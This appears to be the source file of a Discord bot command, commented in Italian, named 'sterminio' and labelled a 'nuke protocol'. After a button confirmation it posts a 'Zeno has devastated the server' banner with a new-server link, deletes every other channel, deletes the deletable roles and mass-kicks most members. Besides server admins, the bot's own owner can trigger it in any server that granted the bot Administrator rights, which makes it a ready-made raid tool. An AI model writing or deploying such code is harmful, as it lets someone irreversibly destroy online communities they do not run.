import { isOwner } from './owner.js';
import {
  SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle,
  PermissionFlagsBits, MessageFlags,
} from 'discord.js';

const DEFAULT_PORTAL = 'https://discord.gg/IL_TUO_INVITO';

const specialChars = {
  a: '𝐚', b: '𝐛', c: '𝐜', d: '𝐝', e: '𝐞', f: '𝐟', g: '𝐠', h: '𝐡', i: '𝐢',
  j: '𝐣', k: '𝐤', l: '𝐥', m: '𝐦', n: '𝐧', o: '𝐨', p: '𝐩', q: '𝐪', r: '𝐫',
  s: '𝐬', t: '𝐭', u: '𝐮', v: '𝐯', w: '𝐰', x: '𝐱', y: '𝐲', z: '𝐳',
  A: '𝐀', B: '𝐁', C: '𝐂', D: '𝐃', E: '𝐄', F: '𝐅', G: '𝐆', H: '𝐇', I: '𝐈',
  J: '𝐉', K: '𝐊', L: '𝐋', M: '𝐌', N: '𝐍', O: '𝐎', P: '𝐏', Q: '𝐐', R: '𝐑',
  S: '𝐒', T: '𝐓', U: '𝐔', V: '𝐕', W: '𝐖', X: '𝐗', Y: '𝐘', Z: '𝐙',
  '0': '𝟎', '1': '𝟏', '2': '𝟐', '3': '𝟑', '4': '𝟒',
  '5': '𝟓', '6': '𝟔', '7': '𝟕', '8': '𝟖', '9': '𝟗',
};
const fancy = (text) => text.split('').map((c) => specialChars[c] || c).join('');

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const isInteraction = (ctx) => typeof ctx.isChatInputCommand === 'function';

global.stermPending = global.stermPending || new Map();

export const data = new SlashCommandBuilder()
  .setName('sterminio')
  .setDescription('⚠️ DISTRUZIONE TOTALE: Elimina canali, ruoli ed espelle tutti (solo owner/admin)')
  .addStringOption((o) => o.setName('link').setDescription('Link del nuovo server da mostrare'))
  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator);

async function sterminio(ctx, { text = '' } = {}) {
  const slash = isInteraction(ctx);
  const guild = ctx.guild;
  const senderId = slash ? ctx.user.id : ctx.author.id;
  const say = (payload) => ctx.reply(payload);

  if (!guild) return say('❌ Questo comando funziona solo nei server.');

  const member = await guild.members.fetch(senderId).catch(() => null);
  const isAdmin = member?.permissions.has(PermissionFlagsBits.Administrator);
  if (!isOwner(senderId) && !isAdmin) {
    return say('❌ Solo admin del server o owner del bot possono usare questo comando.');
  }

  const me = await guild.members.fetchMe();
  if (!me.permissions.has(PermissionFlagsBits.Administrator)) {
    return say('❌ Al bot serve il permesso di **Amministratore** per eseguire una distruzione totale.');
  }

  const rawText = text || '';
  let link = (slash ? ctx.options.getString('link') : rawText).trim();
  if (!link || !link.startsWith('http')) link = DEFAULT_PORTAL;

  global.stermPending.set(guild.id, { link, byUserId: senderId, ts: Date.now() });

  const embed = new EmbedBuilder()
    .setColor(0xff0000)
    .setTitle('⚠️ ATTENZIONE: PROTOCOLLO NUKE ATTIVO ⚠️')
    .setDescription(
      'Stai per avviare la **distruzione totale e permanente** di questo server:\n\n'
      + '🔥 Eliminazione di **tutti i canali**\n'
      + '🔥 Eliminazione di **tutti i ruoli**\n'
      + '🔥 **Espulsione di massa** di tutti i membri\n\n'
      + `📎 Link di riserva: ${link}\n\n`
      + '**Questa azione è irreversibile!** Hai 60 secondi per confermare.',
    );

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`sterm:go:${guild.id}:${senderId}`).setLabel('💀 DISTRUGGI TUTTO').setStyle(ButtonStyle.Danger),
    new ButtonBuilder().setCustomId(`sterm:cancel:${guild.id}:${senderId}`).setLabel('Annulla').setStyle(ButtonStyle.Secondary),
  );

  await say({ embeds: [embed], components: [row] });

  setTimeout(() => {
    const p = global.stermPending.get(guild.id);
    if (p && p.ts === global.stermPending.get(guild.id)?.ts) global.stermPending.delete(guild.id);
  }, 60_000);
}

sterminio.command = /^sterminio$/i;
sterminio.help = ['sterminio'];
sterminio.tags = ['owner'];
sterminio.owner = true;
sterminio.desc = 'Distruzione totale del server';

export default sterminio;

export const prefix = 'sterm';
export async function onComponent(i) {
  const [, action, guildId, byUserId] = i.customId.split(':');
  const guild = i.guild;

  if (i.user.id !== byUserId) {
    return i.reply({ content: '⛔ Solo chi ha lanciato il comando può confermare o annullare.', flags: MessageFlags.Ephemeral });
  }

  const pending = global.stermPending.get(guildId);
  if (!pending) {
    return i.update({ content: '⌛ Richiesta scaduta, rilancia `/sterminio`.', embeds: [], components: [] });
  }

  if (action === 'cancel') {
    global.stermPending.delete(guildId);
    return i.update({ content: '✅ Distruzione annullata.', embeds: [], components: [] });
  }

  if (action !== 'go') return;
  global.stermPending.delete(guildId);

  const member = await guild.members.fetch(i.user.id).catch(() => null);
  if (!isOwner(i.user.id) && !member?.permissions.has(PermissionFlagsBits.Administrator)) {
    return i.update({ content: '❌ Permessi insufficienti.', embeds: [], components: [] });
  }

  await i.update({ content: '🔥 PROTOCOLLO NUKE AVVIATO... Pulizia totale in corso!', embeds: [], components: [] });
  const channel = i.channel;

  // 1. Creazione di un canale di emergenza per lasciare il messaggio finale prima di radere al suolo gli altri
  let finalChannel = channel;
  try {
    finalChannel = await guild.channels.create({
      name: 'zeno-sterminio',
      type: 0, // GuildText
    });
  } catch (e) {}

  await finalChannel.send(
    '╔═══════ ✦ ☠️ ✦ ═══════╗\n\n'
    + '      🔥 *𝐙𝐄𝐍𝐎 𝐇𝐀 DEVASTATO IL SERVER* 🔥\n\n'
    + `🔗 **NUOVO PORTALE:**\n${pending.link}\n\n`
    + '╚═══════ ✦ ☠️ ✦ ═══════╝\n\n'
    + '_Il passato è stato cancellato._ 💀',
  ).catch(() => {});

  // 2. Eliminazione massiva di tutti gli altri canali in parallelo
  const channels = Array.from(guild.channels.cache.values()).filter(c => c.id !== finalChannel.id);
  await Promise.all(channels.map(c => c.delete('Zeno Nuke').catch(() => {})));

  // 3. Eliminazione massiva dei ruoli (tranne @everyone e ruoli gestiti/superiori)
  const roles = Array.from(guild.roles.cache.values()).filter(r => !r.managed && r.id !== guild.id && r.position < guild.members.me.roles.highest.position);
  await Promise.all(roles.map(r => r.delete('Zeno Nuke').catch(() => {})));

  // 4. Espulsione di tutti i membri in parallelo (escluso il bot, l'owner e chi ha lanciato il comando)
  const botId = guild.client.user.id;
  const targets = Array.from(guild.members.cache.values()).filter((m) =>
    m.id !== botId
    && m.id !== byUserId
    && m.id !== guild.ownerId
    && !isOwner(m.id)
    && !m.permissions.has(PermissionFlagsBits.Administrator)
  );

  const batchSize = 10;
  for (let j = 0; j < targets.length; j += batchSize) {
    const batch = targets.slice(j, j + batchSize);
    await Promise.all(batch.map(m => m.kick('Zeno Total Destruction').catch(() => {})));
    await sleep(50);
  }
}
